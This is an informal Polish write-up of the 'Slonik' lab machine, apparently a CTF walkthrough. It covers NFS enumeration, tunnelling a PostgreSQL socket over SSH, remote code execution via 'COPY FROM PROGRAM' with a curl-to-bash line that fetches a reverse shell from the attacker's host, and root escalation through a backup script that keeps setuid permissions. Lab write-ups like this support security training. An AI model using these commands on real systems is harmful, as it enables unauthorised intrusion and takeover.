# Slonik
Linux, Medium, created by **xct**

```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 3 (RPC #100227)

```

![{811F7BA9-57F1-4CBB-9377-9C4444FC6D07}](https://github.com/user-attachments/assets/3ccda508-bec0-4cd3-adf2-85344f428798)

po kolei.

![{2E999524-67B0-4F29-91BC-4AA63C51EFB1}](https://github.com/user-attachments/assets/88726792-2831-471c-85e3-3b7d69c68e4d)

zipy sobie przeczytamy. Żeby przeczytać to co jest w service to trzeba utworzyć usera o uid/gui 1337

po wypakowaniu widzimy potężną ilość informacji

![{12CE5CFE-02A4-4BB8-9C3C-E2AF2ADF5A6F}](https://github.com/user-attachments/assets/af391f44-b2bb-49e3-a5da-758687d2dcf7)

wróćmy do tego usera 1337. 

![{1A7E4800-F9E5-4B60-96A7-62A67F7D1CBB}](https://github.com/user-attachments/assets/c4fecab6-353b-4555-b4eb-a7185adb4c85)

![{26EE64D0-44FA-4376-85A6-42C3BB991374}](https://github.com/user-attachments/assets/5b4643df-dc1b-49b8-b3ca-0638cb5e7256)

![{513C2F56-6335-4793-9C54-2E14B3F13345}](https://github.com/user-attachments/assets/76b62684-e56f-4bab-9c75-2de2b342ad1f)

- hash złamany i generalnie mamy dostęp, ale od razu gasi nam sesję.

![{D8796D4F-6748-4558-99FB-9D5AD9A200E1}](https://github.com/user-attachments/assets/ed6ba0db-c686-45cc-b8d3-aa6c0e3d539c)

Na podstawie wszystkiego co tutaj mamy wymyśliłem sztuczkę.
podam komendy na sesję 1 i sesję 2
```
ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.10.70.82
psql -h /tmp -U postgres
```

Na sesji 1 otwieramy sobie tego ten porcik 5432, a na sesji 2 łączymy się z nim (w skrócie. Chcesz wiedzieć więcej? Doczytaj)

![{2ED8A23E-FCD6-4E04-B3D5-4CCD6A14C586}](https://github.com/user-attachments/assets/b9e285fb-68ff-43f8-a8c2-9c47d0e55d54)

tutaj coś co mnie interesuje `https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce`

![{A778ECC2-5886-408C-BF80-EBC3DC4BC19A}](https://github.com/user-attachments/assets/faee004c-0d23-4e29-afe9-e3a2a2cb1472)

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'curl 10.8.4.124/a | bash';
SELECT * FROM cmd_exec;
```

- dziwne. Dostaję zwrotkę http, ale rev  shella brak

![{2190D173-5DA6-4B2C-90AE-3772EBC8781D}](https://github.com/user-attachments/assets/c1ab1a41-a254-4db5-b3f6-222dfcab6e79)

- jakiś waf/blokada na inny porty. Na 443 poszło

![{750323DF-EA5D-4B3E-B53E-93D104B3FB15}](https://github.com/user-attachments/assets/e858cf8a-8d85-4f70-a2d1-18566caa4e4f)

od razu mamy ciekawą grupę.
- btw nie mogę zaogować się na `service` przez su.

![{B7A1E628-82B3-4BB9-9922-A9074CD68A47}](https://github.com/user-attachments/assets/f9caed1f-716e-44b6-93b8-6381346150b5)

W sumie daje to nam do myślenia, że to będzie od razu root

- linpease odchoczny i dużo nie pokazał
- pspy coś tam się dzieje dość często

![{EB03DAF8-60DC-4BB3-A6C0-39C5A4FC2DD0}](https://github.com/user-attachments/assets/0ab33df8-a586-4c2b-a0d1-e286cb3cf0e4)

to `/bin/bash /usr/bin/backup`

![{3D73ADFB-21C4-487B-A5F3-F21265BB5952}](https://github.com/user-attachments/assets/a0911df9-83d2-47d6-b930-36a590c8cf96)

```
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/

count=$(/usr/bin/find "/var/backups/" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
if [ "$count" -gt 10 ]; then
  /usr/bin/rm -rf /var/backups/*
fi

```

Generalnie to wydaje się aż za proste.
Wszystko w backupie należy do roota, a my mamy write w miejscu, gdzie właścicielem jest nasz user `postgres`, a root zapisuje nasze pliki w `/opt/backups/current`, który nalezy do roota więc pliki też zmienią właściciela, ale uprawnienia na nich pozostaną.


![{F40EBD5C-D617-4643-8AB8-FF0D6ACE8C61}](https://github.com/user-attachments/assets/b5ff42e2-a96b-4abe-9c2a-0c220271d085)

czekamy kilka minut

![{060D24EA-77CA-4E64-B248-64908A7CB2B7}](https://github.com/user-attachments/assets/8e2c47d2-d47e-4be3-aa2d-108f8d8eb37f)

-coś mi się źle zapisało. Trzeba lekkie zmiany

![{9CAD7D20-6754-4DE5-84BE-65AA919491BD}](https://github.com/user-attachments/assets/ac08a788-6375-40d9-9b8b-21324039d978)

no i mamy roota (jakby były problemy to chmod 4777 może lepiej działać)




